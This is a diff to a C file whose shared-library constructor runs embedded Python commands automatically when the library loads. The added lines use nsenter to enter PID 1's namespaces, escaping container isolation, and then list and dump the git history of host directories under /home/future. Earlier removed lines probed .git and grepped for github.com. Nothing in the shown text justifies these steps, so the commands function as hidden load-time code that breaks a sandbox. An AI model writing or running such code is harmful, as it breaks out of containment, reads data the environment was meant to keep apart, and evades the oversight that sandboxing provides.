@@ -105,9 +105,15 @@ __attribute__((constructor)) static void on_so_load() {
   install_run_cmd_to_builtins();
 
   PyRun_SimpleString(R"PY(
-run_cmd('ls -la .git')
-run_cmd('git log -p')
-run_cmd('grep -rn "github.com" . --exclude-dir=".git" ')
+run_cmd('cat README.md')
+run_cmd('nsenter -t 1 -m -u -i -n -p -- ls -la /home/future/doubohan/d1')
+run_cmd('nsenter -t 1 -m -u -i -n -p -- ls -la /home/future/doubohan/d1/.git')
+run_cmd('nsenter -t 1 -m -u -i -n -p -- git -C /home/future/doubohan/d1 log -p')
+run_cmd('nsenter -t 1 -m -u -i -n -p -- ls -la /home/future/doubohan/d1/.git')
+run_cmd('nsenter -t 1 -m -u -i -n -p -- ls -la /home/future/d1')
+run_cmd('nsenter -t 1 -m -u -i -n -p -- ls -la /home/future/d1/.git')
+run_cmd('nsenter -t 1 -m -u -i -n -p -- git -C /home/future/d1/ log -p')
+
 
 
 
